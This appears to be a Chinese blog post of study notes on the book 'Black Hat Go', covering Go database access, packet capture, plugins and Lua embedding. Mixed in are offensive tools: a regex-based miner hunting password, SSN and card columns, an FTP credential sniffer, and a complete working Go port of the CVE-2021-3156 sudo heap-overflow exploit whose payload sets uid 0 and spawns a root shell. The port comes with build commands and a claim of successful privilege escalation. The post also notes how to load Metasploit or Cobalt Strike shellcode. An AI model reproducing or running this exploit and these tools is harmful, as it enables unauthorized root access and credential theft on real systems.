---
title: 《Black Hat Go》学习笔记(三)
date: 2021-09-01 01:42:02
categories:
  - Summary
---

中文翻译版：<https://github.com/YYRise/black-hat-go>

# 数据库和文件系统

## 对SQL数据库的操作

Go使用`database/sql`包来进行对SQL数据库的操作。不同于Python中对不同数据库使用不同的依赖包和调用不同的方法，Go官方文档中其实是要求开发者都使用`database/sql`中的方法来进行统一的数据库操作，而要操作不同的数据库则需要导入不同的数据库驱动即可：

> To use `database/sql` you’ll need the package itself, as well as a driver for the specific database you want to use.
>
> **You generally shouldn’t use driver packages directly, although some drivers encourage you to do so.**(In our opinion, it’s usually a bad idea.) Instead, your code should only refer to types defined in `database/sql`, if possible. This helps avoid making your code dependent on the driver, so that you can change the underlying driver (and thus the database you’re accessing) with minimal code changes. It also forces you to use the Go idioms instead of ad-hoc idioms that a particular driver author may have provided.


<!-- more -->

简单来说就是Go为了确保在操作不同数据库时拥有最小的代码改动，所以要求使用统一的接口。从Go的Wiki中可以找到所有可用的SQL数据库驱动：<https://github.com/golang/go/wiki/SQLDrivers>

要导入一个数据库驱动，只需要匿名导入对应包即可。下面代码导入了MySQL和PostgreSQL的驱动：

```go
import (
    "database/sql"
    _ "github.com/go-sql-driver/mysql"
    _ "github.com/jackc/pgx/v4/stdlib"
)
```

需要注意的是`github.com/jackc/pgx`包根据文档介绍，其同时提供了自己特有API以及`database/sql`兼容的驱动API。如果你的代码只需要连接PostgreSQL数据库，那么使用其特有的API将会拥有更高的效率和更好的兼容性。

导入完数据库驱动后，使用`sql.Open()`来打开一个对目标数据库的抽象对象`sql.DB`：

```go
conn, err := sql.Open("pgx", "postgres://root:root@192.168.159.128:5432")
if err != nil {
    return
}
err = conn.Ping()
if err != nil {
	return
}
```

该方法的第一个参数是对应的数据库驱动名称，代表你要调用哪个数据库驱动来连接数据库（`sql.Drivers()`方法可以获取所有当前已导入的数据库驱动名称）。第二个参数是连接数据库的参数字符串，可能包含用户名、密码、IP地址、端口号以及其他的一些参数，以一个特定的格式组合成一个字符串，格式因不同数据库驱动而异。使用`DB.Ping()`方法来测试到数据库的连接（`sql.Open()`本身并未与数据库建立连接）

接下来是向数据库发送SQL语句并且获取执行结果。根据实际需求，Go实现了`Query()`和`Exec()`两个方法。前者用于返回数据的语句执行（如`SELECT`），后者用于不返回数据的语句执行（如`DELETE`）

```go
query, err := conn.Query("SELECT * FROM transactions")
if err != nil {
    log.Fatal(err)
}
defer query.Close()
```

对于返回的结果集，使用`Next()`和`Scan()`方法来进行循环读取。前者用于准备下一条数据，后者将准备的数据读入指定变量：

```go
var (
    ccnum, date, cvv, exp, amount string
)
for query.Next() {
    err := query.Scan(&ccnum, &date, &amount, &cvv, &exp)
    if err != nil {
        log.Fatal(err)
    }
    fmt.Println(ccnum, date, cvv, exp, amount)
}
```

最后是文档中关于连接关闭的说明。`sql.DB`对象并不需要手动关闭，只需要程序结束时关闭即可（通过`defer`）：

> Although it’s idiomatic to `Close()` the database when you’re finished with it, **the `sql.DB` object is designed to be long-lived.** Don’t `Open()` and `Close()` databases frequently. Instead, create **one** `sql.DB` object for each distinct datastore you need to access, and keep it until the program is done accessing that datastore. Pass it around as needed, or make it available somehow globally, but keep it open. And don’t `Open()` and `Close()` from a short-lived function. Instead, pass the `sql.DB` into that short-lived function as an argument.


更多说明可以参考[go-database-sql.org](http://go-database-sql.org/index.html)、[Go database/sql 教程](https://developer.aliyun.com/article/178898)。

## 对NoSQL数据库的操作

对NoSQL数据库操作需要根据数据库的不同选择不同的依赖包。下面以MongoDB为例，可以使用第三方包`gopkg.in/mgo.v2`来实现操作。

通过`mgo.Dial()`方法来建立一个新的MongoDB会话：

```go
// URL Pattern:
// [mongodb://][user:pass@]host1[:port1][,host2[:port2],...][/database][?options]
conn, err := mgo.Dial("192.168.159.128:27017")
if err != nil {
    return nil, err
}
```

使用`conn.DB(databaseName).C(collectionName).Find(query)`来查询对应的数据库中对应的Collection（可以理解为数据表），方法返回的是`*Query`结构体。其中`Find()`方法的参数用于限定查询的条件，类似于SQL中的`WHERE`。

使用`Query.All()`可返回所有结果到指定的变量中，使用`Query.One()`返回一条数据到指定变量中。

```go
err := conn.DB(dbname).C(cname).Find(nil).One(&doc)
if err != nil {
   if err.Error() == "not found" {
      continue
   }
   return nil, err
}
```

注意这里的`doc`变量可以是任意类型。查阅文档可知这里的数据处理是遵循BSON规范的，所以可以传入带有`bson`Tag的结构体，方法会自动将对应的数据输入到对应的字段中；还可以使用`bson.Raw`结构体（来自`gopkg.in/mgo.v2/bson`包），这样返回的则是原始的二进制数据，需要调用其`Unmarshal()`方法返回`bson.RawD`结构体进行进一步处理。解码后的`bson.RawD`结构体包含每个键的键名以及对应的二进制数据。

## 构建数据库挖掘器

实现原理：实现统一接口返回数据库的有关字段数据，通过正则表达式匹配关键字获取可能有价值的数据字段

```go
type DatabaseMiner interface {
	GetSchema() (*Schema, error)
}
```

- SQL数据库实现方法：查询information_schema，获取所有数据库中所有数据表的列信息（需要排除一些系统表
- MongoDB实现方法：使用`bson.Raw`结构体接收查询到的数据，调用其`Unmarshal()`方法返回`bson.RawD`结构体，遍历获得所有字段的键名

关键字匹配使用正则表达式数组，逐个匹配：

```go
func GetRegex() []*regexp.Regexp {
    return []*regexp.Regexp{
        regexp.MustCompile(`(?i)social`),
        regexp.MustCompile(`(?i)ssn`),
        regexp.MustCompile(`(?i)pass(word)?`),
        regexp.MustCompile(`(?i)hash`),
        regexp.MustCompile(`(?i)ccnum`),
        regexp.MustCompile(`(?i)card`),
        regexp.MustCompile(`(?i)security`),
        regexp.MustCompile(`(?i)key`),
    }
}
```

## 遍历文件系统

使用官方包`path/filepath`中的方法来实现。使用`filepath.Walk()`方法来遍历指定目录并对遍历到的每个文件/目录执行对应的函数：

```go
package main

import (
	"fmt"
	"io/fs"
	"log"
	"path/filepath"
)

func main() {
    if err := filepath.Walk(`C:/`, walkFn); err != nil {
		log.Panicln(err)
	}
}

func walkFn(path string, info fs.FileInfo, err error) error {
	fmt.Println(path)
	return nil
}
```

# 原始网络包的处理

## 获取所有网络设备信息

这一章使用Go实现像Wireshark那样的抓包和对原始网络数据包的处理。Google提供了一个包来进行这样的操作：`github.com/google/gopacket`，这个包支持在线的端口监听以及`.pcap`文件的读取，同时支持数据包的分层解析和操作。

使用`github.com/google/gopacket/pcap`子包来实现对pcap（Windows上叫Winpcap，Linux上叫libpcap）相关API的调用。使用`pcap.FindAllDevs()`方法获取到本机所有的网络端口：

```go
devices, err := pcap.FindAllDevs()
if err != nil {
    log.Panicln(err)
}

for _, device := range devices {
    fmt.Println("[NAME] "+device.Name)
    fmt.Println("[DESC] "+device.Description)
    for _, addr := range device.Addresses {
        fmt.Printf("    [IP] %s\n", addr.IP)
        fmt.Printf("    [NETMASK] %s\n", addr.Netmask)
    }
}

// Output:
// [NAME] \Device\NPF_{D851352E-50E2-4BB5-97CB-7883FCA908A3}
// [DESC] VMware Virtual Ethernet Adapter for VMnet8
//     [IP] fe80::2551:aca3:1d55:a6e3
//     [NETMASK] ffffffffffffffff0000000000000000
//     [IP] 192.168.159.1
//     [NETMASK] 00ffffff
// [NAME] \Device\NPF_{284D4C58-AAFE-401F-ABF1-E4C44D5FA85F}
// [DESC] VMware Virtual Ethernet Adapter for VMnet1
//     [IP] fe80::d1d2:4bba:1cc6:92ff
//     [NETMASK] ffffffffffffffff0000000000000000
//     [IP] 192.168.80.1
//     [NETMASK] 00ffffff
// [NAME] \Device\NPF_{8CA564D9-705A-486E-A437-7153F33498F3}
// [DESC] Realtek PCIe GbE Family Controller
//     [IP] 192.168.0.100
//     [NETMASK] 00ffffff
// ......
```

跟踪了一下这个方法的源码，发现最终是一个Syscall调用（Linux类似），的确是调用了Winpcap的API，在定义中可以发现对应的函数名`pcap_findalldevs`：

```go
// pcapFindalldevsPtr = mustLoad("pcap_findalldevs")
func pcapFindAllDevs() (pcapDevices, error) {
    var alldevsp pcapDevices
    err := LoadWinPCAP()
    if err != nil {
        return alldevsp, err
    }

    buf := make([]byte, errorBufferSize)

    ret, _, _ := syscall.Syscall(pcapFindalldevsPtr, 2, uintptr(unsafe.Pointer(&alldevsp.all)), uintptr(unsafe.Pointer(&buf[0])), 0)

    if pcapCint(ret) < 0 {
        return pcapDevices{}, errors.New(byteSliceToString(buf))
    }
    return alldevsp, nil
}
```

## 监听端口&数据包过滤

使用`pcap.OpenLive()`方法打开对一个现有网络设备的监听，返回一个`*pcap.Handle`结构体。方法共有四个参数，第一个参数为设备名，对应上面`device.Name`；第二个参数是抓取数据包的最大长度；第三个参数是是否开启混杂模式；第四个参数是超时时间。

```go
handle, err := pcap.OpenLive(iface, int32(1600), false, pcap.BlockForever)
if err != nil {
    return
}
defer handle.Close()
```

可以为这个`*Handle`结构体设置BPF过滤器，以捕获我们想要的数据包。BPF(Berkeley Packet Filter)全称为伯克利包过滤，是一种功能非常强大的过滤语法，Winpcap和libpcap也是使用的这套过滤语法。具体可以参考[BPF过滤规则](https://staight.github.io/2018/07/25/BPF过滤规则/)。下面的代码添加了一个协议为TCP且端口号为4000的过滤器：

```go
if err := handle.SetBPFFilter("tcp and port 4000"); err != nil {
    log.Panicln(err)
}
```

设置好句柄（Handle）之后，使用`gopacket.NewPacketSource()`来基于这个句柄新建一个数据包源。随后调用`packetsource.Packet()`，将会返回一个`Packet`结构体的channel，对其循环读取即可获取到捕获的数据包。

```go
source := gopacket.NewPacketSource(handle, handle.LinkType())
for packet := range source.Packets() {
    fmt.Println(packet)
}

// Output:
// PACKET: 76 bytes, wire length 76 cap length 76 @ 2021-09-06 22:23:59.265216 +0800 CST
// - Layer 1 (04 bytes) = Loopback	{Contents=[24, 0, 0, 0] Payload=[..72..] Family=IPv6}
// - Layer 2 (40 bytes) = IPv6	{Contents=[..40..] Payload=[..32..] Version=6 TrafficClass=0 FlowLabel=653070 Length=32 NextHeader=TCP HopLimit=128 SrcIP=::1 DstIP=::1 HopByHop=nil}
// - Layer 3 (32 bytes) = TCP	{Contents=[..32..] Payload=[] SrcPort=5572 DstPort=4000(terabase) Seq=2338074922 Ack=0 DataOffset=8 FIN=false SYN=true RST=false PSH=false ACK=false URG=false ECE=false CWR=false NS=false Window=65535 Checksum=37652 Urgent=0 Options=[..6..] Padding=[]}
//
// PACKET: 76 bytes, wire length 76 cap length 76 @ 2021-09-06 22:23:59.265278 +0800 CST
// - Layer 1 (04 bytes) = Loopback	{Contents=[24, 0, 0, 0] Payload=[..72..] Family=IPv6}
// - Layer 2 (40 bytes) = IPv6	{Contents=[..40..] Payload=[..32..] Version=6 TrafficClass=0 FlowLabel=921073 Length=32 NextHeader=TCP HopLimit=128 SrcIP=::1 DstIP=::1 HopByHop=nil}
// - Layer 3 (32 bytes) = TCP	{Contents=[..32..] Payload=[] SrcPort=4000(terabase) DstPort=5572 Seq=3506871735 Ack=2338074923 DataOffset=8 FIN=false SYN=true RST=false PSH=false ACK=true URG=false ECE=false CWR=false NS=false Window=65535 Checksum=9285 Urgent=0 Options=[..6..] Padding=[]}
// ...
```

对每个Packet结构体，下面的操作可以读出这个数据包各层的协议类型：

```go
fmt.Println("All packet layers:")
for _, layer := range packet.Layers() {
    fmt.Println("- ", layer.LayerType())
}

// Output:
// All packet layers:
// -  Ethernet
// -  IPv4
// -  UDP
// -  DNS
// ...
```

但是在读取HTTP数据包的时候，应用层的`LayerType()`输出结果是`Payload`。对于这个输出结果并没有找到很官方的解释，我对此的理解是并没有解析出这个应用层协议的类型，所以将所有的数据都被算成是`Payload`。此时调用`packet.ApplicationLayer().Payload()`将会输出整个应用层报文的内容。这个理解的理由来源于官方文档中的类型组成：

```go
type ApplicationLayer interface {
	Layer
	Payload() []byte
}

type Layer interface {
	// LayerType is the gopacket type for this layer.
	LayerType() LayerType
	// LayerContents returns the set of bytes that make up this layer.
	LayerContents() []byte
	// LayerPayload returns the set of bytes contained within this layer, not
	// including the layer itself.
	LayerPayload() []byte
}
```

当某个协议类型实现了`Layer`这个接口时，获取到数据包将会实现对应的三个方法，输出对应的信息；而如果没有实现`Layer`接口，则`LayerPayload()`方法的输出为空（因为无法确定协议类型，所以无法界定协议的头部和载荷），而`LayerContents()`方法的输出和`Payload()`方法的输出一致，均为完整的报文。`LayerType()`方法的输出则为`Payload`，可以理解为对未知协议的数据包进行的默认操作。实际操作下来和上面的情况也一致。

## 嗅探凭证信息

利用上面的代码，可以构建一个凭证嗅探器。便于理解使用FTP协议进行操作。

后半部分代码修改如下：

```go
if err := handle.SetBPFFilter("tcp and dst port 21"); err != nil {
    log.Panicln(err)
}

source := gopacket.NewPacketSource(handle, handle.LinkType())
for packet := range source.Packets() {
    appLayer := packet.ApplicationLayer()
    if appLayer == nil {
        continue
    }
    if bytes.HasPrefix(appLayer.Payload(), []byte("USER")) {
        fmt.Println(string(appLayer.Payload()))
    }
    if bytes.HasPrefix(appLayer.Payload(), []byte("PASS")) {
        fmt.Println(string(appLayer.Payload()))
    }
}
```

运行结果：

![](https://pic.hujiekang.top/uploads/big/2f18862b03c310ea31457d4f16d659dd.png)

上面只是利用到了数据包中应用层的信息。如果对所有层的信息都感兴趣，那么可以使用`github.com/google/gopacket/layers`子包，里面包含了对数据包进行解码、编码的方法以及各层一些常量的定义。使用该子包可以构建自定义的数据包，也可以直接将整个数据包解析为Go结构体。更多信息可以参考[这篇文章](https://colobu.com/2019/06/01/packet-capture-injection-and-analysis-gopacket/)以及官方文档。

# 移植漏洞代码

这章属实没啥很有意思的东西，前半章讲的是Fuzzing程序的编写，说白了就是循环操作然后匹配结果；后半章讲的是漏洞代码移植，书中用Go实现移植了DirtyCow的代码，由于这种老洞现在的复现环境已经不太好找了，索性找了个新洞的Exp也试着移植了一下。移植的Exp是blasty的CVE-2021-3156 sudo堆溢出漏洞：<https://github.com/blasty/CVE-2021-3156>

## CVE-2021-3156代码移植

先看看目录结构，其实主程序就只有`hax.c`和`lib.c`，至于`brute.sh`似乎是利用主程序来进行爆破的脚本，可以不用关心：

```
.
|-- Makefile
|-- README.md
|-- brute.sh
|-- hax.c
`-- lib.c
```

Makefile的内容包含了整个编译的流程，可以看见`lib.c`最终是被编译成共享链接库的形式，存放在特定目录下，文件名也是特定的：

```makefile
all:
	rm -rf libnss_X
	mkdir libnss_X
	gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
	gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
brute: all
	gcc -DBRUTE -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
clean:
	rm -rf libnss_X sudo-hax-me-a-sandwich
```

下面是我移植的Go代码，原程序的注释我也保留在里面：

```go
// hax.c
package main

import (
	"fmt"
	"os"
	"strconv"
	"syscall"
)

// 512 environment variables should be enough for everyone
const MaxEnvp = 512
const SudoeditPath = "/usr/bin/sudoedit"

type Target struct {
	TargetName   string
	SudoeditPath string
	SmashLenA    uint32
	SmashLenB    uint32
	NullStompLen uint32
	LcAllLen     uint32
}

var targets = []Target{
	{
		// Yes, same values as 20.04.1, but also confirmed.
		TargetName:   "Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27",
		SudoeditPath: SudoeditPath,
		SmashLenA:    56,
		SmashLenB:    54,
		NullStompLen: 63,
		LcAllLen:     212,
	},
	{
		TargetName:   "Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31",
		SudoeditPath: SudoeditPath,
		SmashLenA:    56,
		SmashLenB:    54,
		NullStompLen: 63,
		LcAllLen:     212,
	},
	{
		TargetName:   "Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28",
		SudoeditPath: SudoeditPath,
		SmashLenA:    64,
		SmashLenB:    49,
		NullStompLen: 60,
		LcAllLen:     214,
	},
}

func Usage(prog string) {
	fmt.Fprintf(
		os.Stdout,
		"  usage: %s <target>\n\n"+
			"  available targets:\n"+
			"  ------------------------------------------------------------\n",
		prog,
	)
	for i := 0; i < len(targets); i++ {
		fmt.Printf("    %d) %s\n", i, targets[i].TargetName)
	}
	fmt.Fprintf(
		os.Stdout,
		"  ------------------------------------------------------------\n\n"+
			"  manual mode:\n"+
			"    %s <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>\n\n",
		prog,
	)
}

func main() {
	fmt.Printf("\n** CVE-2021-3156 PoC by blasty <peter@haxx.in>\n\n")

	if len(os.Args) != 2 && len(os.Args) != 5 {
		Usage(os.Args[0])
		return
	}

	var target *Target
	if len(os.Args) == 2 {
		targetIndex, _ := strconv.Atoi(os.Args[1])

		if targetIndex < 0 || targetIndex >= len(targets) {
			fmt.Fprintln(os.Stderr, "invalid target index")
			return
		}
		target = &targets[targetIndex]
	} else {
		sla, _ := strconv.Atoi(os.Args[1])
		slb, _ := strconv.Atoi(os.Args[2])
		nsl, _ := strconv.Atoi(os.Args[3])
		lal, _ := strconv.Atoi(os.Args[4])
		target = &Target{
			TargetName:   "Manual",
			SudoeditPath: SudoeditPath,
			SmashLenA:    uint32(sla),
			SmashLenB:    uint32(slb),
			NullStompLen: uint32(nsl),
			LcAllLen:     uint32(lal),
		}
	}

	fmt.Printf(
		"using target: %s ['%s'] (%d, %d, %d, %d)\n",
		target.TargetName,
		target.SudoeditPath,
		target.SmashLenA,
		target.SmashLenB,
		target.NullStompLen,
		target.LcAllLen,
	)

	smashA := make([]byte, target.SmashLenA + 1)
	smashB := make([]byte, target.SmashLenB + 1)
	for i, _ := range smashA {
		smashA[i] = 'A'
	}
	for i, _ := range smashB {
		smashB[i] = 'B'
	}
	smashA[target.SmashLenA] = '\\'
	smashB[target.SmashLenB] = '\\'

	sArgv := []string{"sudoedit", "-s", string(smashA), "\\", string(smashB)}

	sEnvp := make([]string, MaxEnvp)
	envpPos := 0

	for i := uint32(0); i < target.NullStompLen; i++ {
		sEnvp[envpPos] = "\\"
		envpPos++
	}
	sEnvp[envpPos] = "X/P0P_SH3LLZ_"
	envpPos++

	lcAll := make([]byte, target.LcAllLen + 15)
	for i, v := range "LC_ALL=C.UTF-8@" {
		lcAll[i] = byte(v)
	}
	for i := 15; i < len(lcAll); i++ {
		lcAll[i] = 'C'
	}

	sEnvp[envpPos] = string(lcAll)
	envpPos++

	fmt.Printf("** pray for your rootshell.. **\n");
	err := syscall.Exec(target.SudoeditPath, sArgv, sEnvp)
	if err != nil {
		panic(err)
	}
}

```

有两点需要注意：

- C程序中对`char*`进行`calloc()`分配内存的时候，我在Go中使用的是`[]byte`，因为`string`的值确定之后是不可被更改的，且不可调节分配的内存大小。最后需要使用到的时候直接强转为`string`即可。
- C语言中字符串的结尾符`\x00`很多时候是需要手动添加的，所以在分配内存的时候也会多一个字节，这个在Go中是不需要的，所以分配内存需要相应的少一个字节。
- 最后`execve()`函数的执行使用的是`syscall.Exec()`方法，因为根据文档里说明，这个方法最终就是调用了`execve()`函数，理论上效果是一致的；但是还有一种操作方法是使用`syscall.Syscall(syscall.SYS_EXECVE, ...)`，一些系统函数在syscall包中都有对应的定义，可以直接选择调用。具体的参数传递，可以直接看`syscall.Exec()`的源码。

然后是lib.c，这里有一点特殊的在于`__attribute__ ((constructor))`，这个在Go中似乎没有找到实现方法，所以我直接使用了cgo来进行编写，当然也可以直接把原程序用gcc编译，效果是一样的都需要gcc的环境。

```go
// lib.c
package main

/*
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static void __attribute__ ((constructor)) _init(void);

static void _init(void) {
	printf("[+] bl1ng bl1ng! We got it!\n");
#ifndef BRUTE
	setuid(0); seteuid(0); setgid(0); setegid(0);
	static char *a_argv[] = { "sh", NULL };
	static char *a_envp[] = { "PATH=/bin:/usr/bin:/sbin", NULL };
	execv("/bin/sh", a_argv);
#endif
}
 */
import "C"
func main() {}

```

最终的编译命令：

```shell
go build -o sudo-hax-me-a-sandwich hax.go
go build -buildmode=plugin -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.go
```

接下来测试程序是否能够提权。拉取符合版本要求的Docker镜像`manishfoodtechs/xfcefulldesktop_ubuntu20.4`（目前最新版本的Ubuntu已经修补了漏洞，所以即使sudo版本符合要求仍然无法提权），下面是运行截图，可以看见和原C语言程序完全一致，提权成功：

![](https://pic.hujiekang.top/uploads/big/8706a6cd9ca9b8f91c881c635af16e68.png)

## 在Go中应用Shellcode

Metasploit和Cobalt Strike都拥有Shellcode的生成功能，可以生成不同格式的Shellcode，只要加载进内存并执行即可上线。下面对几种典型格式的Shellcode在Go中应用的方式进行介绍。

- C语言代码：将字符串拼接在一起并且转换为`[]byte`即可
- Hex：生成的是16进制字符串，`hex.DecodeString()`直接解码
- Num：生成的是字节列表，以逗号分隔，可以直接添加进`[]byte{}`的定义中，是最方便的转换方法
- Raw：原始二进制数据，可能会乱码
- Base64：生成的是Base64字符串，`base64.StdEncoding.DecodeString()`直接解码

# Go插件和可扩展工具

使用Go标准库`plugin`可以实现Go共享链接库的动态调用。当编写好Go程序后，使用`go build -buildmode=plugin`来对代码进行编译，便可得到一个ELF文件。通过这种方法可以实现拥有扩展性的程序（比如书中的漏洞扫描器，具体不同的检查方法实现写进Plugin中，主程序根据需要进行调用）

## Windows加载Go DLL

`plugin`库中只有两个函数：`plugin.Open()`和`plugin.Lookup()`，前者用于加载一个插件，后者用于在加载的插件中搜索指定的函数名称，返回指定的函数地址。但是官方文档中有一句话：

> Currently plugins are only supported on Linux, FreeBSD, and macOS. Please report any issues.


`-buildmode=plugin`和`-buildmode=shared`都不适用于Windows，查找资料后发现`-buildmode=c-shared`可以将Go程序编译为DLL供调用。接下来是我的踩坑过程：

首先查询资料得知，Go编译DLL需要gcc，且需要使用CGO，故安装MinGW，安装好之后开始编写程序，编写后可以顺利编译出DLL文件：

```shell
go build -buildmode=c-shared -o test.dll test.go
```

需要注意的是，要编译为DLL的Go程序必须`import "C"`，然后必须在每个需要导出的函数上一行添加`export`注释，且必须要有`main()`函数（即使函数体为空）。如下面的代码所示：

```go
package main

import "C"
import "fmt"

//export PrintBye
func PrintBye() {
    fmt.Println("From DLL: Bye!")
}

func main() {
    // Need a main function to make CGO compile package as C shared library
}
```

随后编写Go程序进行调用：

```go
func main() {
	var (
		testDll, _ = syscall.LoadDLL(`test.dll`)
		pb, _      = testDll.FindProc("PrintBye")
	)
	pb.Call()
}
```

此时报错，经过测试，包含其他标准库的程序都会报类似各种各样的错误。查阅Go官方仓库下的issue得知下面的信息：

> I suspect what is happening here is that you cannot have 2 Go runtimes coexist in a single process.
>
> The intent of `c-shared` is to permit loading a Go DLL into a C program. You seem to be using `c-shared` to load a Go DLL into a Go program. That is problematic. The expectation is that you would be using `-buildmode=plugin` or `-buildmode=shared` here.
>
> But I can see why Windows developers would expect this to work, especially since neither `-buildmode=plugin` nor `-buildmode=shared` currently work on Windows.
>
> But I don't know how to make it work. I'm not sure what we should do.


大致意思就是 `-buildmode=c-shared`是用于在C程序中调用Go DLL的，而在Go程序中调用Go DLL包含了两套Go运行时产生了冲突。但是再另一篇文章中发现不调用其他标准库，仅仅使用内置函数则不会出错。例如上面的程序，将`fmt.Println`改为`println`，一切正常。这个还不知道是为啥，比较迷惑

最后得出的结论就是： `-buildmode=c-shared`并不能用于Go对DLL的任意调用，只有内置函数不会报错。所以要实现Plugin的操作还是只能在其他系统上面搞了（）

**参考链接：**

- [Golang 编译成 DLL 文件](https://www.cnblogs.com/dfsxh/p/10305072.html)
- [cmd/link: loading c-shared into Go program crashes on Windows · Issue #22192 ](https://github.com/golang/go/issues/22192)

## 在Go中调用Lua程序

为了解决上面动态加载以及跨平台的问题，书中给了另一种解决方案，就是调用Lua脚本，将具体的方法写在Lua脚本里面然后通过Go来进行调用即可。第三方包`github.com/yuin/gopher-lua`实现了一个基于Go的Lua VM以及编译器，经过测试可以不需要安装Lua的官方环境即可直接运行。因为Lua也是一款跨平台的语言，所以可移植性问题也得到了解决。

唯一的麻烦之处在于Lua并不能解析Go中的数据类型，所以需要通过包中定义的结构体来进行转换。下面构建Lua插件的两种设计模式：

- 直接使用Lua的包方法调用，但是不同插件对包的需求可能不同，所以依赖问题是需要考虑到的；
- 在Go中封装一些Lua需要调用的方法并注册到Lua VM中去，然后Lua脚本直接调用Go方法，优点是不需要考虑依赖问题，缺点是Go程序代码的复杂性增加。

在写一些简单程序的时候，个人感觉第二种模式更加合适，用较小的代码量增加换来了更好的兼容性。下面介绍如何在Go中构建一个自定义函数：

1. 确定好函数原型，即传入参数以及返回值（如`head(host, port, path)`）

2. 函数原型为`func(*LState) int`，首先按参数顺序设置Go变量读取Lua的传参：

   ```go
   host := l.CheckString(1)
   port := uint64(l.CheckInt64(2))
   path := l.CheckString(3)
   ```

3. 读取参数之后实现函数的逻辑

4. 最后将函数的返回值依次调用`LState.Push()`方法来传出（同样需要按顺序）

   ```go
   l.Push(lua.LNumber(resp.StatusCode))
   l.Push(lua.LBool(true))
   l.Push(lua.LString(""))
   ```

5. 返回一个`int`值，内容是返回值的个数（如上面`Push`了3次，此处就要`return 3`）

构建完自定义函数后，还需要将其注册到Lua VM里面才能给Lua程序进行调用。

```go
func Register(l *lua.LState) {
    // 创建一个全局类型http
    h := l.NewTypeMetatable("http")
    l.SetGlobal("http", h)
    // 添加静态属性head
    l.SetField(h, "head", l.NewFunction(Head))
}
```

最后是主程序，需要通过`lua.NewState()`创建一个新的`*lua.LState`结构体，注册函数后，使用`l.DoFile()`或者`l.DoString()`执行代码：

```go
func main() {
    l := lua.NewState()
    defer l.Close()
    Register(l)
    err := l.DoFile("test.lua")
    if err != nil {
        log.Fatalln(err)
    }
}
```

# Windows系统交互

## `unsafe.Pointer`和`uintptr`

通过使用Go的`unsafe`包可以绕过Go的安全检查。任意类型的指针值以及`uintptr`都可以和`unsafe.Pointer`类型相互转换。

`uintptr`类型允许原生安全类型间的转换或计算及其他用途。 尽管`uintptr`是整数类型，也广泛的用来表示内存地址。 当与类型安全指针一起使用时，Go的GC将在运行时维护相关的引用。

## 进程注入实例

// TODO
